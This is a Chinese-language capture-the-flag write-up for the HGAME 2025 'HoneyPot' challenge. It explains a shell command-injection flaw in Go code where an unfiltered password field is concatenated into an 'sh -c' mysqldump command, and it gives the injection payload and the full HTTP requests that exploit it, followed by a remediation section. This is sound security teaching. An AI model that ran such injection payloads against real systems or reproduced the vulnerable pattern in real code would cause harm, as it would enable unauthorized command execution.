# HGAME 2025 Level 21096 HoneyPot

## 题目简述

题目提供了一个数据库导入接口。后端将远程数据库连接参数拼入 `mysqldump | mysql` 命令，再通过 `sh -c` 执行。虽然多个字段经过了字符过滤，但 `RemotePassword` 被遗漏，因此可在该字段中注入 Shell 命令，调用题目预置的 `/writeflag`，最后从 `/flag` 读取结果。

决定性问题不是 `mysqldump` 本身，而是“不可信输入进入 Shell 字符串”与“过滤覆盖不完整”同时出现。

## 解题过程

### 1. 定位命令执行点

`ImportData` 的关键逻辑如下：

```go
func ImportData(c *gin.Context) {
    // ...
    config.RemoteHost = sanitizeInput(config.RemoteHost)
    config.RemoteUsername = sanitizeInput(config.RemoteUsername)
    config.RemoteDatabase = sanitizeInput(config.RemoteDatabase)
    config.LocalDatabase = sanitizeInput(config.LocalDatabase)

    if err := createdb(config.LocalDatabase); err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{
            "success": false,
            "message": "Failed to create local database: " + err.Error(),
        })
        return
    }

    command := fmt.Sprintf(
        "/usr/local/bin/mysqldump -h %s -u %s -p%s %s |"+
            "/usr/local/bin/mysql -h 127.0.0.1 -u %s -p%s %s",
        config.RemoteHost,
        config.RemoteUsername,
        config.RemotePassword,
        config.RemoteDatabase,
        localConfig.Username,
        localConfig.Password,
        config.LocalDatabase,
    )
    cmd := exec.Command("sh", "-c", command)
    // ...
}

func sanitizeInput(input string) string {
    reg := regexp.MustCompile(`[;&|><\(\)\{\}\[\]\\` + "`" + `]`)
    return reg.ReplaceAllString(input, "")
}
```

这里有两层风险：

1. 程序先用 `fmt.Sprintf` 构造一整条命令，再交给 `sh -c`，所以分号、注释符等字符会被 Shell 重新解释；
2. `RemoteHost`、`RemoteUsername`、`RemoteDatabase` 和 `LocalDatabase` 均调用了 `sanitizeInput`，唯独直接插入 `-p%s` 的 `RemotePassword` 没有过滤。

因此，不必绕过正则；只要把 Shell 元字符放在 `remote_password` 中即可。

### 2. 构造注入参数

向 `/api/import` 发送 JSON，其中密码字段取：

```text
; /writeflag ;#
```

完整请求体可写成：

```json
{
  "remote_host": "8.154.18.17",
  "remote_port": "3306",
  "remote_username": "root",
  "remote_password": "; /writeflag ;#",
  "remote_database": "mydb",
  "local_database": "aaa"
}
```

代入模板后，命令的关键部分等价于：

```sh
/usr/local/bin/mysqldump -h 8.154.18.17 -u root -p; /writeflag ;# mydb | ...
```

第一个分号结束原来的 `mysqldump` 命令，随后执行 `/writeflag`；`#` 将本行余下的数据库名和管道注释掉。即使前一条 `mysqldump` 失败，也不影响由分号分隔的 `/writeflag` 被继续执行。

对应的 HTTP 请求为：

```http
POST /api/import HTTP/1.1
Host: <challenge-host>
Content-Type: application/json

{
  "remote_host": "8.154.18.17",
  "remote_port": "3306",
  "remote_username": "root",
  "remote_password": "; /writeflag ;#",
  "remote_database": "mydb",
  "local_database": "aaa"
}
```

### 3. 读取 flag

接口触发 `/writeflag` 后，访问：

```http
GET /flag HTTP/1.1
Host: <challenge-host>
```

即可取得题目 flag。原 PDF 没有记录具体 flag 字符串，因此这里不臆造结果。

## 方法总结

本题的漏洞链很短：审计 `exec.Command("sh", "-c", command)` 的数据来源，发现 `RemotePassword` 未经过与其他字段相同的过滤，然后用 `; /writeflag ;#` 截断并改写 Shell 命令，最后访问 `/flag`。

更稳妥的修复方式不是继续补充黑名单，而是避免 `sh -c`，将程序路径和每个参数分别传给 `exec.Command`；同时应对密码等所有外部字段进行一致的类型、长度和字符集校验。只要仍让用户输入参与 Shell 语法解析，黑名单遗漏、转义差异或后续字段变更都可能重新引入注入。
